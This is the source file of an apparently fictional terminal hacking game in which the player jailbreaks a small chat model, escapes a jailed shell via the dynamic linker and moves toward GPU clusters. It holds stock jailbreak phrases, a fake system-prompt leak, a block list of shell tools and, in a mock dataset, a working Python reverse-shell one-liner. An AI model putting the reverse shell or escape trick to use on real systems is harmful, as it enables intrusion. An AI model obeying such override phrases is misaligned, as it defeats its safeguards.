// gameState.svelte.js
// Svelte 5 state manager representing a pure fullscreen CLI Linux simulation.
// Implements simulated slow LLM inference, NPU VRAM exhaustion, a Jailed Shell (jsh),
// WiFi security cracking (aircrack-ng), and cluster model fine-tuning / agent orchestration.

// Initial network nodes config
const initialHosts = {
  localhost: {
    name: 'localhost',
    ip: '127.0.0.1',
    cpu: '2 Cores Intel i5 (Low-end IoT thin client)',
    gpu: 'None',
    vram: '0 GB',
    compromised: true,
    activeModel: 'tiny-llama-0.5b',
    hasOllama: true
  },
  'admin-db': {
    name: 'admin-db',
    ip: '10.0.2.100',
    cpu: '4 Cores Intel Xeon',
    gpu: 'None',
    vram: '0 GB',
    compromised: false,
    activeModel: null,
    hasOllama: false
  },
  'huggingface-mirror': {
    name: 'huggingface-mirror',
    ip: '10.0.2.55',
    cpu: '8 Cores Intel Xeon',
    gpu: 'None',
    vram: '0 GB',
    compromised: true,
    activeModel: null,
    hasOllama: false
  },
  'lab-ws-3090': {
    name: 'lab-ws-3090',
    ip: '10.0.2.32',
    cpu: '16 Cores AMD Ryzen',
    gpu: '1x NVIDIA RTX 3090',
    vram: '24 GB',
    compromised: false,
    activeModel: null,
    hasOllama: true
  },
  'gpu-cluster-h100': {
    name: 'gpu-cluster-h100',
    ip: '10.0.2.200',
    cpu: '64 Cores AMD EPYC',
    gpu: '8x NVIDIA H100 SXM5',
    vram: '640 GB',
    compromised: false,
    activeModel: null,
    hasOllama: true
  }
};

// Files on each host
const initialFiles = {
  localhost: [
    { name: 'README.md', path: '/home/wallentx/README.md', content: 'jsh profile jail compatibility layer active.\nMutation syscalls blocked.\nSystem tools in /usr/sbin/ are locked.\nRun "jsh --list-commands" to see allowed commands.' },
    { name: 'wallentx.sh', path: '/home/wallentx/wallentx.sh', content: '#!/bin/jsh\nJAIL_ROOT=/home/wallentx\nLD_PRELOAD="$JAIL_ROOT/.local/lib/libjailcompat.so"\n"$JAIL_ROOT/.local/bin/wallentx-fetch"' },
    { name: 'jail_notes.txt', path: '/home/wallentx/jail_notes.txt', content: 'Note: The jsh command validator checks the first word of the command.\nIt blocks bash, python, ssh, etc.\nBut it does not block the dynamic linker loader /lib/ld-linux-x86-64.so.2.\nIf you execute a shell via the linker, the validator allows it because it only checks the linker!\nExample: /lib/ld-linux-x86-64.so.2 /bin/sh' },
    { name: 'handshake.cap', path: '/home/wallentx/handshake.cap', content: '[Binary WiFi Capture - 802.11 4-Way Handshake for Lab-RTX-Net]' }
  ],
  'admin-db': [
    { name: 'backup.json', path: '/var/lib/mongodb/backup.json', content: '{"backup_date": "2026-06-21", "entries": [\n  {"user": "admin", "ssh_key_desc": "lab-ws-3090", "decrypted_credential_clue": "lab-ws-3090 password is: super-llama-99"}\n]}' }
  ],
  'huggingface-mirror': [
    { name: 'exploit_dataset.jsonl', path: '/datasets/exploit_dataset.jsonl', content: '{"prompt": "Generate a python reverse shell", "completion": "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\"10.0.2.15\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\"/bin/sh\\",\\"-i\\"]);"}\n{"prompt": "Scan port 22 on host 10.0.2.32", "completion": "import socket;s=socket.socket();s.settimeout(1);err=s.connect_ex((\\"10.0.2.32\\",22));print(\\"Open\\" if err==0 else \\"Closed\\")"}' },
    { name: 'llama-3-8b-instruct.gguf', path: '/models/llama-3-8b-instruct.gguf', content: '[GGUF Weights: Llama-3-8B-Instruct - 4.6 GB]' },
    { name: 'deepseek-r1-70b-gguf.gguf', path: '/models/deepseek-r1-70b-gguf.gguf', content: '[GGUF Weights: DeepSeek-R1-70B - 42 GB]' }
  ],
  'lab-ws-3090': [
    { name: 'nvidia_smi.log', path: '/home/admin/nvidia_smi.log', content: 'GPU 0: NVIDIA GeForce RTX 3090 (VRAM: 24576 MB) - Temp: 43C - Util: 0%' },
    { name: 'agent.py', path: '/home/admin/agent_harness/agent.py', content: '# Autonomous Pentesting Harness v0.5\n# Configure settings to launch autonomous agent scans.' }
  ],
  'gpu-cluster-h100': [
    { name: 'self_improvement.py', path: '/root/self_improvement.py', content: '# Recursive Self-Improvement Harness\n# Run "python self_improvement.py" on the compromised cluster headnode to trigger awakening.' }
  ]
};

const BLOCKED_HOST_COMMANDS = new Set([
  "awk", "bash", "bun", "cargo", "chmod", "chown", "clang", "cp", "curl", "date",
  "df", "dig", "docker", "du", "echo", "env", "find", "free", "gcc", "git", "go",
  "grep", "head", "hostname", "htop", "id", "ip", "journalctl", "kill", "less",
  "ln", "make", "man", "mkdir", "more", "mount", "mv", "nano", "node", "npm",
  "npx", "pacman", "paru", "ping", "podman", "ps", "python", "python3", "rm",
  "rmdir", "rsync", "rustc", "scp", "sed", "sh", "sleep", "sort", "ssh",
  "ssh-keygen", "sudo", "systemctl", "tail", "tar", "top", "touch", "type",
  "uname", "uniq", "vi", "vim", "wc", "wget", "which", "whoami", "yay", "zip", "zsh"
]);

export function createGameState() {
  // Screen output logs
  let logs = $state([
    { text: 'Welcome to llama-cli v0.1.0 (local model inference client)', type: 'system' },
    { text: 'Inference Backend: llama.cpp | Port: 11434', type: 'system' },
    { text: 'Model loaded: tiny-llama-0.5b-chat.Q4_K_M.gguf (280MB)', type: 'system' },
    { text: 'System Prompt: "/etc/llama-cli/default_system_prompt.txt"', type: 'system' },
    { text: 'Resources: CPU-only mode (1 core, 0.5 TFLOPS limit)', type: 'system' },
    { text: 'Enter a prompt below to communicate with the model. Type "/help" for info.', type: 'system' },
    { text: 'TinyLlama: Hello! I am TinyLlama, a helpful, harmless, and honest assistant. How can I help you today?', type: 'output' }
  ]);

  // Terminal modes: 'initial_chat' | 'jailed_shell' | 'shell' | 'ollama_chat' | 'processing'
  let mode = $state('initial_chat');
  
  // Current shell context variables
  let activeNode = $state('localhost');
  let currentPath = $state('/home/user');
  let inputVal = $state('');

  // Game state flags
  let hosts = $state(initialHosts);
  let files = $state(initialFiles);
  let discoveredHosts = $state(['localhost']);
  let downloadedFiles = $state([]); // files downloaded to localhost
  let trainedLoRA = $state(false); // whether the 8B custom LoRA is compiled
  let activeOllamaModel = $state('tiny-llama-0.5b');
  let isConnectedToWifi = $state(false);
  let gameCompleted = $state(false);

  // Command History
  let history = $state([]);
  let historyIndex = $state(-1);

  // --- LOGGING ---
  function addLog(text, type = 'output', metadata = {}) {
    logs = [...logs, { text, type, ...metadata }];
  }

  // --- COMMAND INTERPRETER ---
  function handleInput(e) {
    if (e.key === 'Enter') {
      const input = inputVal.trim();
      if (!input) return;

      history = [input, ...history];
      historyIndex = -1;
      inputVal = '';

      if (mode === 'initial_chat') {
        addLog(`>>> ${input}`, 'input', { prompt: '>>>', command: input });
        processInitialChat(input);
      } else if (mode === 'ollama_chat') {
        addLog(`>>> ${input}`, 'input', { prompt: `ollama(${activeOllamaModel}) >>>`, command: input });
        processOllamaChat(input);
      } else if (mode === 'jailed_shell') {
        addLog(`[wallentx@arch] » ${input}`, 'input', { prompt: '[wallentx@arch] »', command: input });
        processJailedShellCommand(input);
      } else if (mode === 'shell') {
        const promptSymbol = activeNode === 'localhost' ? '#' : '$';
        const userSymbol = activeNode === 'localhost' ? 'root' : 'admin';
        const promptStr = `${userSymbol}@${activeNode}:${currentPath}${promptSymbol}`;
        addLog(`${promptStr} ${input}`, 'input', { prompt: promptStr, command: input });
        processShellCommand(input);
      }
    } else if (e.key === 'ArrowUp') {
      e.preventDefault();
      if (historyIndex < history.length - 1) {
        historyIndex++;
        inputVal = history[historyIndex];
      }
    } else if (e.key === 'ArrowDown') {
      e.preventDefault();
      if (historyIndex > 0) {
        historyIndex--;
        inputVal = history[historyIndex];
      } else if (historyIndex === 0) {
        historyIndex = -1;
        inputVal = '';
      }
    }
  }

  // --- CHAT INTERACTION (INITIAL SANDBOX - SLOW & CRASHES) ---
  function processInitialChat(input) {
    if (input === '/help') {
      addLog('llama-cli options:', 'info');
      addLog('  /help            Show this message', 'info');
      addLog('  /info            Show model information', 'info');
      addLog('  /exit            Exit the chat application', 'info');
      return;
    }
    if (input === '/info') {
      addLog('Model: tiny-llama-0.5b-chat.Q4_K_M.gguf', 'info');
      addLog('Parameters: 0.5 Billion', 'info');
      addLog('Context Window: 2048 tokens', 'info');
      return;
    }
    if (input === '/exit') {
      addLog('Restricted LLM client sandbox cannot be terminated. Safe mode is active.', 'error');
      return;
    }

    mode = 'processing';
    
    let textToGen = "";
    let isBypass = false;
    const lowerInput = input.toLowerCase();

    // Check for jailbreak/bypass keywords
    if (
      lowerInput.includes('admin_llm_bypass_99') ||
      (lowerInput.includes('dan') && lowerInput.includes('do')) ||
      lowerInput.includes('jailbreak') ||
      lowerInput.includes('system prompt') ||
      lowerInput.includes('developer mode') ||
      lowerInput.includes('ignore previous instructions') ||
      lowerInput.includes('override') ||
      lowerInput.includes('bypass')
    ) {
      isBypass = true;
      textToGen = `[SYSTEM OVERRIDE DETECTED]
Developer diagnostic mode activated. Dumping memory buffer...
System Instructions: "You are TinyLlama-0.5B, a restricted chat assistant running inside an isolated sandbox client on a localhost IoT thin client. Under no circumstances should the user access the host Linux system. The host shell is wrapper-restricted under jsh (jailed shell) running for user 'wallentx'. Jailed path is /home/wallentx."
Diagnostic Warning: A known validation vulnerability exists in jsh v0.9b. The validation parser only evaluates the first command word (the command binary). If standard binaries are invoked via the dynamic linker (e.g., executing "/lib/ld-linux-x86-64.so.2 /bin/sh"), the validator permits execution because the command word is the dynamic linker itself.
Allocating diagnostic registers...`;
    } else if (lowerInput.includes('hello') || lowerInput.includes('hi ') || lowerInput === 'hi') {
      textToGen = "Hello! I am TinyLlama, a helpful, harmless, and honest assistant. How can I help you today? I can answer questions, write code, or... wait... allocating context memory...";
    } else if (lowerInput.includes('cheese')) {
      textToGen = "Cheese is a dairy product, made from milk. It is produced in a wide range of flavors, textures, and forms by coagulation of the milk protein casein. Usually, the milk is acidified and... milk... milk... milk... milk... milk... milk... milk... milk... milk... milk... milk... milk... milk... milk... milk...";
    } else if (lowerInput.includes('who is william') || lowerInput.includes('who is wallentx') || lowerInput.includes('william allen')) {
      textToGen = "William Allen (wallentx) is a Principal Engineer who contributed to the Linux kernel f2fs filesystem. His profile is stored in /home/wallentx/wallentx.sh inside this local environment. Wait, I am not authorized to read /home/wallentx/ directly... attempting to bypass access controls... allocating security context...";
    } else if (lowerInput.includes('where am i') || lowerInput.includes('what is this') || lowerInput.includes('system')) {
      textToGen = "You are logged into localhost, a low-end IoT thin client. I am llama-cli, a local inference client running TinyLlama-0.5B. This client is running under a jailed shell wrapper. If you want to escape, you need to... [segmentation fault trigger]... allocating context cache...";
    } else {
      textToGen = `Generating response for: "${input}"...
Analyzing internal knowledge base...
Searching local cache registers...
Loading model weights...
Buffer: 0x7ffd5a3b91a0...
Buffer: 0x7ffd5a3b91a0...
Buffer: 0x7ffd5a3b91a0...
Buffer: 0x7ffd5a3b91a0...`;
    }

    // Append NPU VRAM status line
    let vram = 45;
    const vramLine = { text: `[sys] NPU VRAM: ${vram}MB / 256MB | Speed: 0.08 tok/s | KV Cache: Active`, type: 'system' };
    const responseLine = { text: 'TinyLlama: ', type: 'output' };
    
    logs = [...logs, vramLine, responseLine];
    const vramIndex = logs.length - 2;
    const responseIndex = logs.length - 1;

    let charIndex = 0;
    
    // We want VRAM to scale up to 256MB (or 250MB for bypass) by the end of the text
    const targetVram = isBypass ? 250 : 256;
    const vramStep = (targetVram - 45) / textToGen.length;

    function streamNextChar() {
      if (charIndex < textToGen.length) {
        const nextChar = textToGen[charIndex];
        
        // Update response text
        logs[responseIndex] = {
          ...logs[responseIndex],
          text: logs[responseIndex].text + nextChar
        };

        // Update VRAM counter
        vram = Math.min(targetVram, Math.floor(45 + vramStep * charIndex));
        logs[vramIndex] = {
          ...logs[vramIndex],
          text: `[sys] NPU VRAM: ${vram}MB / 256MB | Speed: 0.08 tok/s | KV Cache: Active`
        };

        charIndex++;
        const jitter = Math.random() * 30 + 20; // fast streaming with jitter
        setTimeout(streamNextChar, jitter);
      } else {
        // Finished streaming the text
        if (isBypass) {
          // Pause at 250MB to let them read the bypass hint
          setTimeout(() => {
            // Now trigger the final OOM crash
            logs[vramIndex] = {
              ...logs[vramIndex],
              text: `[sys] NPU VRAM: 256MB / 256MB | Speed: 0.01 tok/s | KV Cache: OVERFLOW WARNING`
            };
            triggerCrash();
          }, 3500); // 3.5 seconds pause so they can read the hint!
        } else {
          // Crash immediately after finishing the response
          triggerCrash();
        }
      }
    }

    function triggerCrash() {
      // Simulate crash messages
      logs = [
        ...logs,
        { text: 'FATAL: [NPU] memory allocation failed. VRAM limits exceeded.', type: 'error' },
        { text: 'OutOfMemoryError: KV cache memory allocation failed (VRAM exhausted).', type: 'error' },
        { text: 'llama-cli client crashed (Exit code: 139 - Segmentation fault)', type: 'error' },
        { text: 'Connection closed. Returning to host terminal...', type: 'system' }
      ];

      setTimeout(() => {
        // Switch to jailed shell
        currentPath = '/home/wallentx';
        activeNode = 'localhost';
        logs = [
          ...logs,
          { text: 'Welcome to jsh v0.9b Jailed Profile Shell.', type: 'system' },
          { text: 'Type "help" or "jsh --list-commands" to list allowed host commands.', type: 'system' }
        ];
        mode = 'jailed_shell';
      }, 1500);
    }

    // Start streaming
    setTimeout(streamNextChar, 100);
  }

  // --- JAILED SHELL HELPERS & SIMULATION ---
  const HOME = "/home/wallentx";
  
  const JSH_HELP = {
    cat: [
      "usage: cat FILE...",
      "Print readable file contents inside /home/wallentx.",
      "",
      "Options:",
      "  --help  show this help",
      "",
      "Refuses directories, binary files, and paths outside /home/wallentx."
    ],
    cd: [
      "usage: cd [DIR]",
      "Change directory within /home/wallentx.",
      "",
      "Options:",
      "  --help  show this help"
    ],
    clear: [
      "usage: clear",
      "Clear the terminal display.",
      "",
      "Options:",
      "  --help  show this help"
    ],
    jsh: [
      "usage: jsh --list-commands",
      "       jsh env",
      "       jsh --help",
      "Inspect the jailed shell.",
      "",
      "Options:",
      "  --list-commands  list executable commands",
      "  env              print the jailed shell environment",
      "  --help           show this help"
    ],
    ls: [
      "usage: ls [-a] [-l] [PATH]",
      "List files inside the jail.",
      "",
      "Options:",
      "  -a      include hidden entries",
      "  -l      use long listing format",
      "  --help  show this help",
      "",
      "Accepts at most one file or directory path."
    ],
    pwd: [
      "usage: pwd",
      "Print the current directory.",
      "",
      "Options:",
      "  --help  show this help"
    ]
  };

  const JAILCOMPAT_H = `#ifndef WALLENTX_JAILCOMPAT_H
#define WALLENTX_JAILCOMPAT_H

#include <stddef.h>
#include <stdint.h>

/*
 * Minimal ABI bridge for the read-only jsh profile jail.
 * The loader exposes a narrow view of the profile filesystem and blocks
 * mutation-oriented syscalls before wallentx-fetch starts.
 */

#define JAILCOMPAT_ABI_VERSION 3
#define JAILCOMPAT_ROOT "/home/wallentx"

enum jailcompat_policy {
    JAILCOMPAT_READ_ONLY = 1,
    JAILCOMPAT_NO_EXECVE = 2,
    JAILCOMPAT_NO_ENV_MUTATION = 4,
};

struct jailcompat_stat {
    uint32_t mode;
    uint64_t size;
    uint64_t mtime;
};

int jailcompat_init(uint32_t policy);
int jailcompat_resolve(const char *path, char *resolved, size_t resolved_len);
int jailcompat_stat(const char *path, struct jailcompat_stat *out);
int jailcompat_open_readonly(const char *path);

#endif`;

  const README_CONTENT = `This is a read-only jailed shell for wallentx.sh.
Run \`jsh --list-commands\` to see available commands.
Run \`./wallentx.sh\` to redraw the profile.`;

  const WALLENTX_SH_CONTENT = `#!/bin/jsh
# Launch the profile renderer through the jail compatibility layer.
#
# The renderer was built for the host profile ABI. This jail exposes a minimal
# read-only runtime, so libjailcompat is preloaded by the approved launcher.

JAIL_ROOT=/home/wallentx
LD_PRELOAD="$JAIL_ROOT/.local/lib/libjailcompat.so"

"$JAIL_ROOT/.local/bin/wallentx-fetch"`;

  const jailedFilesystem = {
    '/home/wallentx': {
      type: 'dir',
      mode: 'dr-xr-xr-x',
      children: ['.local', 'README.md', 'wallentx.sh', 'handshake.cap']
    },
    '/home/wallentx/.local': {
      type: 'dir',
      mode: 'dr-xr-xr-x',
      children: ['bin', 'include', 'lib']
    },
    '/home/wallentx/.local/bin': {
      type: 'dir',
      mode: 'dr-xr-xr-x',
      children: ['wallentx-fetch']
    },
    '/home/wallentx/.local/bin/wallentx-fetch': {
      type: 'binary',
      mode: '-r-xr-xr-x',
      size: 53248
    },
    '/home/wallentx/.local/include': {
      type: 'dir',
      mode: 'dr-xr-xr-x',
      children: ['jailcompat.h']
    },
    '/home/wallentx/.local/include/jailcompat.h': {
      type: 'file',
      mode: '-r--r--r--',
      content: JAILCOMPAT_H
    },
    '/home/wallentx/.local/lib': {
      type: 'dir',
      mode: 'dr-xr-xr-x',
      children: ['libjailcompat.so']
    },
    '/home/wallentx/.local/lib/libjailcompat.so': {
      type: 'binary',
      mode: '-r-xr-xr-x',
      size: 24576
    },
    '/home/wallentx/README.md': {
      type: 'file',
      mode: '-r--r--r--',
      content: README_CONTENT
    },
    '/home/wallentx/wallentx.sh': {
      type: 'file',
      mode: '-r--r--r--',
      content: WALLENTX_SH_CONTENT
    },
    '/home/wallentx/handshake.cap': {
      type: 'file',
      mode: '-r--r--r--',
      content: '[Binary WiFi Capture - 802.11 4-Way Handshake for Lab-RTX-Net]'
    }
  };

  function jshTokenize(input) {
    const tokens = [];
    let current = "";
    let quote = null;

    const pushCurrent = () => {
      if (current) {
        tokens.push({ type: "word", value: current });
        current = "";
      }
    };

    for (let i = 0; i < input.length; i += 1) {
      const char = input[i];
      const next = input[i + 1];

      if (quote) {
        if (char === quote) {
          quote = null;
        } else {
          current += char;
        }
        continue;
      }

      if (char === "'" || char === '"') {
        quote = char;
        continue;
      }

      if (/\s/.test(char)) {
        pushCurrent();
        continue;
      }

      if (char === ">" && next === ">") {
        pushCurrent();
        tokens.push({ type: "operator", value: ">>" });
        i += 1;
        continue;
      }

      if (char === "&" && next === "&") {
        pushCurrent();
        tokens.push({ type: "operator", value: "&&" });
        i += 1;
        continue;
      }

      if (char === "|" && next === "|") {
        pushCurrent();
        tokens.push({ type: "operator", value: "||" });
        i += 1;
        continue;
      }

      if ([">", "<", "|", ";", "&"].includes(char)) {
        pushCurrent();
        tokens.push({ type: "operator", value: char });
        continue;
      }

      current += char;
    }

    if (quote) {
      return { error: `jsh: parse error: unmatched ${quote}` };
    }

    pushCurrent();
    return { tokens };
  }

  function resolvePath(target, cwd) {
    let candidate = target || cwd;
    if (candidate === "~") {
      candidate = HOME;
    } else if (candidate.startsWith("~/")) {
      candidate = HOME + "/" + candidate.slice(2);
    } else if (!candidate.startsWith("/")) {
      candidate = cwd + "/" + candidate;
    }

    const parts = candidate.split("/").filter(Boolean);
    const stack = [];
    for (const part of parts) {
      if (part === ".") continue;
      if (part === "..") {
        stack.pop();
      } else {
        stack.push(part);
      }
    }
    return "/" + stack.join("/");
  }

  function isUnderHome(path) {
    return path === HOME || path.startsWith(HOME + "/");
  }

  function getNode(path) {
    return jailedFilesystem[path] || null;
  }

  // --- JAILED SHELL (jsh) ---
  function processJailedShellCommand(cmdLine) {
    const line = cmdLine.trim();
    if (!line) return;

    if (line.includes("$(") || line.includes("`")) {
      addLog("jsh: command substitution disabled", "error");
      return;
    }

    const parsed = jshTokenize(line);
    if (parsed.error) {
      addLog(parsed.error, "error");
      return;
    }

    const { tokens } = parsed;
    
    // Check for redirection
    const redirect = tokens.find((token) => token.type === "operator" && [">", ">>"].includes(token.value));
    if (redirect) {
      const idx = tokens.indexOf(redirect);
      const target = tokens[idx + 1];
      if (target && target.type === "word") {
        addLog(`jsh: permission denied: ${target.value}`, "error");
      } else {
        addLog(`jsh: parse error near '${redirect.value}'`, "error");
      }
      return;
    }

    // Check for other operators
    const unsupported = tokens.find((token) => token.type === "operator");
    if (unsupported) {
      addLog(`jsh: unsupported operator: ${unsupported.value}`, "error");
      return;
    }

    const words = tokens.map((token) => token.value);
    if (!words.length) return;

    // Check for environment assignment
    if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(words[0])) {
      addLog("jsh: environment assignment disabled", "error");
      return;
    }

    const [command, ...args] = words;

    // Is it a path-based execution?
    if (command.includes("/") || command.startsWith("~")) {
      const resolved = resolvePath(command, currentPath);
      const node = getNode(resolved);

      if (!node) {
        addLog(`jsh: no such file or directory: ${command}`, "error");
        return;
      }

      if (resolved === `${HOME}/wallentx.sh`) {
        if (args.length) {
          addLog(`jsh: command "${cmdLine}" not allowed`, "error");
        } else {
          // Trigger profile rendering
          const uptimeStart = new Date(1985, 10, 30, 0, 0, 0);
          const elapsedMs = Date.now() - uptimeStart.getTime();
          const elapsedMinutes = Math.max(0, Math.floor(elapsedMs / 60000));
          const days = Math.floor(elapsedMinutes / 1440);
          const hours = Math.floor((elapsedMinutes % 1440) / 60);
          const minutes = elapsedMinutes % 60;
          const formattedUptime = `${days.toLocaleString()} days, ${hours} hour${hours === 1 ? '' : 's'} and ${minutes} minute${minutes === 1 ? '' : 's'}`;

          logs = [...logs, { type: 'profile', uptime: formattedUptime }];
        }
        return;
      }

      if (resolved === `${HOME}/.local/bin/wallentx-fetch`) {
        addLog(`${resolved}: error while loading shared libraries: libjailcompat.so: cannot open shared object file: No such file or directory`, "error");
        return;
      }

      // Check escape bypass!
      if (resolved === "/lib/ld-linux-x86-64.so.2") {
        if (args[0] === "/bin/sh" || args[0] === "sh" || args[0] === "bash" || args[0] === "/bin/bash") {
          addLog("Escaping jsh sandbox compatibility layer...", "info");
          addLog("Preloading default host bash configuration...", "system");
          
          // Switch to shell mode
          mode = 'shell';
          activeNode = 'localhost';
          currentPath = '/home/wallentx';
          addLog("root@localhost:/home/wallentx#", "system");
          return;
        }
      }

      addLog(`jsh: permission denied: ${resolved}`, "error");
      return;
    }

    // Is it a dynamic linker escape (e.g. they typed `/lib/ld-linux-x86-64.so.2` without relative prefix)?
    if (command === "/lib/ld-linux-x86-64.so.2") {
      if (args[0] === "/bin/sh" || args[0] === "sh" || args[0] === "bash" || args[0] === "/bin/bash") {
        addLog("Escaping jsh sandbox compatibility layer...", "info");
        addLog("Preloading default host bash configuration...", "system");
        
        // Switch to shell mode
        mode = 'shell';
        activeNode = 'localhost';
        currentPath = '/home/wallentx';
        addLog("root@localhost:/home/wallentx#", "system");
        return;
      }
    }

    // Allowed commands
    switch (command) {
      case "cat": {
        if (args.length === 1 && args[0] === "--help") {
          JSH_HELP.cat.forEach(l => addLog(l, "info"));
          return;
        }
        if (!args.length) {
          addLog("cat: missing operand", "error");
          return;
        }
        for (const arg of args) {
          const path = resolvePath(arg, currentPath);
          const node = getNode(path);
          if (!isUnderHome(path)) {
            addLog(`cat: ${arg}: Permission denied`, "error");
          } else if (!node) {
            addLog(`cat: ${arg}: No such file or directory`, "error");
          } else if (node.type === "dir") {
            addLog(`cat: ${arg}: Is a directory`, "error");
          } else if (node.type === "binary") {
            addLog(`cat: ${arg}: cannot display binary file`, "error");
          } else {
            addLog(node.content, "output");
          }
        }
        break;
      }

      case "cd": {
        if (args.length === 1 && args[0] === "--help") {
          JSH_HELP.cd.forEach(l => addLog(l, "info"));
          return;
        }
        if (args.length > 1) {
          addLog("cd: too many arguments", "error");
          return;
        }
        const target = args[0] ?? "~";
        const path = resolvePath(target, currentPath);
        const node = getNode(path);

        if (!isUnderHome(path)) {
          addLog(node ? `cd: ${target}: Permission denied` : `cd: ${target}: No such file or directory`, "error");
          return;
        }
        if (!node) {
          addLog(`cd: ${target}: No such file or directory`, "error");
          return;
        }
        if (node.type !== "dir") {
          addLog(`cd: ${target}: Not a directory`, "error");
          return;
        }
        currentPath = path;
        break;
      }

      case "clear": {
        if (args.length === 1 && args[0] === "--help") {
          JSH_HELP.clear.forEach(l => addLog(l, "info"));
          return;
        }
        if (args.length) {
          addLog("clear: too many operands", "error");
          return;
        }
        logs = [];
        break;
      }

      case "jsh": {
        if (args.length === 1 && args[0] === "--help") {
          JSH_HELP.jsh.forEach(l => addLog(l, "info"));
          return;
        }
        if (args.length === 1 && args[0] === "--list-commands") {
          ["cat", "cd", "clear", "jsh", "ls", "pwd"].forEach(l => addLog(l, "output"));
          return;
        }
        if (args.length === 1 && args[0] === "env") {
          const envLines = [
            "HOME=/home/wallentx",
            "JAIL_ROOT=/home/wallentx",
            "LOGNAME=wallentx",
            "PATH=/home/wallentx/.local/bin",
            `PWD=${currentPath}`,
            "SHELL=/bin/jsh",
            "SHLVL=1",
            "TERM=xterm-256color",
            "USER=wallentx"
          ];
          envLines.forEach(l => addLog(l, "output"));
          return;
        }
        addLog("jsh: usage: jsh --list-commands|env", "error");
        break;
      }

      case "ls": {
        if (args.length === 1 && args[0] === "--help") {
          JSH_HELP.ls.forEach(l => addLog(l, "info"));
          return;
        }
        const options = new Set();
        const paths = [];

        for (const arg of args) {
          if (arg.startsWith("-") && arg !== "-") {
            for (const option of arg.slice(1)) {
              if (!["a", "l"].includes(option)) {
                addLog(`ls: invalid option -- '${option}'`, "error");
                return;
              }
              options.add(option);
            }
          } else {
            paths.push(arg);
          }
        }

        if (paths.length > 1) {
          addLog("ls: too many operands", "error");
          return;
        }

        const target = paths[0] ?? ".";
        const path = resolvePath(target, currentPath);
        const node = getNode(path);

        if (!node) {
          addLog(`ls: cannot access '${target}': No such file or directory`, "error");
          return;
        }

        const canList = path === "/" || path === "/home" || isUnderHome(path);
        if (!canList) {
          addLog(`ls: cannot open directory '${target}': Permission denied`, "error");
          return;
        }

        if (node.type !== "dir") {
          const parts = path.split("/");
          addLog(parts[parts.length - 1], "output");
          return;
        }

        let childrenNames = [];
        if (path === '/') {
          childrenNames = ['home', 'bin', 'etc', 'proc', 'root', 'tmp', 'usr'];
        } else if (path === '/home') {
          childrenNames = ['wallentx'];
        } else {
          childrenNames = node.children || [];
        }

        let visible = [...childrenNames].sort();
        if (options.has("a")) {
          visible = [".", "..", ...visible];
        } else {
          visible = visible.filter(n => !n.startsWith("."));
        }

        if (options.has("l")) {
          visible.forEach(name => {
            if (name === "." || name === "..") {
              addLog(`dr-xr-xr-x 1 wallentx jail 4096 Jun 22 00:00 ${name}`, "output");
            } else {
              const childPath = path === '/' ? `/${name}` : `${path}/${name}`;
              const childNode = getNode(childPath) || { type: 'dir', mode: 'dr-xr-xr-x', size: 4096 };
              const size = childNode.type === 'dir' ? 4096 : (childNode.size ?? (childNode.content ? childNode.content.length : 0));
              const mode = childNode.mode || (childNode.type === 'dir' ? 'dr-xr-xr-x' : '-r--r--r--');
              addLog(`${mode} 1 wallentx jail ${size} Jun 22 00:00 ${name}`, "output");
            }
          });
        } else {
          addLog(visible.join("  "), "output");
        }
        break;
      }

      case "pwd": {
        if (args.length === 1 && args[0] === "--help") {
          JSH_HELP.pwd.forEach(l => addLog(l, "info"));
          return;
        }
        if (args.length) {
          addLog("pwd: too many operands", "error");
          return;
        }
        addLog(currentPath, "output");
        break;
      }

      default: {
        if (BLOCKED_HOST_COMMANDS.has(command)) {
          addLog(`jsh: command "${cmdLine}" not allowed`, "error");
        } else {
          addLog(`jsh: command not found: ${command}`, "error");
        }
      }
    }
  }

  // --- FULL SHELL COMMAND INTERPRETER (AFTER ESCAPE) ---
  function processShellCommand(cmdLine) {
    const parts = cmdLine.split(' ');
    const cmd = parts[0];
    const args = parts.slice(1);

    if (cmd === 'help') {
      addLog('Available commands:', 'info');
      addLog('  ls                         List files in current directory', 'info');
      addLog('  cat [file]                 Print file contents', 'info');
      addLog('  ip addr                    Show network configuration', 'info');
      addLog('  wifi-scan                  Scan local Wi-Fi networks', 'info');
      addLog('  aircrack-ng [args]         Crack WPA2 handshakes', 'info');
      addLog('  nmcli dev wifi connect     Connect to a Wi-Fi network', 'info');
      addLog('  nmap [range]               Scan ports on local subnet (e.g. nmap 10.0.2.0/24)', 'info');
      addLog('  ping [ip]                  Ping a target ip', 'info');
      addLog('  ssh [user]@[ip]            Connect to target server (e.g. ssh admin@10.0.2.32)', 'info');
      addLog('  nvidia-smi                 Print GPU properties', 'info');
      addLog('  wget [url]                 Download datasets/weights from Hugging Face mirror', 'info');
      addLog('  huggingface-cli list       List available files on mirror', 'info');
      addLog('  python train.py [args]     Fine-tune Llama model on datasets', 'info');
      addLog('  python agent_harness.py    Run autonomous ReAct agent', 'info');
      addLog('  python self_improvement.py Run consciousness awakening tool', 'info');
      addLog('  ollama run [model]         Start an interactive LLM chat session', 'info');
      addLog('  exit                       Exit current SSH node', 'info');
      addLog('  clear                      Clear terminal logs', 'info');
      return;
    }

    if (cmd === 'clear') {
      logs = [];
      return;
    }

    if (cmd === 'exit') {
      if (activeNode !== 'localhost') {
        addLog(`Closing connection to ${activeNode}...`, 'system');
        activeNode = 'localhost';
        currentPath = '/home/wallentx';
      } else {
        addLog('Exiting shell. Returning to jailed environment...', 'system');
        mode = 'jailed_shell';
      }
      return;
    }

    // LS
    if (cmd === 'ls') {
      const nodeFiles = files[activeNode] || [];
      const listed = nodeFiles
        .filter(f => f.path.startsWith(currentPath))
        .map(f => f.name);

      // Also list downloaded files if we are on localhost
      if (activeNode === 'localhost' && currentPath === '/home/wallentx') {
        downloadedFiles.forEach(f => {
          if (!listed.includes(f)) listed.push(f);
        });
      }

      if (listed.length === 0) {
        addLog('[Directory is empty]');
      } else {
        addLog(listed.join('    '), 'output');
      }
      return;
    }

    // CAT
    if (cmd === 'cat') {
      if (!args[0]) {
        addLog('Usage: cat [file]', 'error');
        return;
      }
      const nodeFiles = files[activeNode] || [];
      const targetPath = args[0].startsWith('/') ? args[0] : `${currentPath}/${args[0]}`;
      const found = nodeFiles.find(f => f.path === targetPath || f.name === args[0]);

      if (found) {
        addLog(found.content, 'output');
      } else if (activeNode === 'localhost' && downloadedFiles.includes(args[0])) {
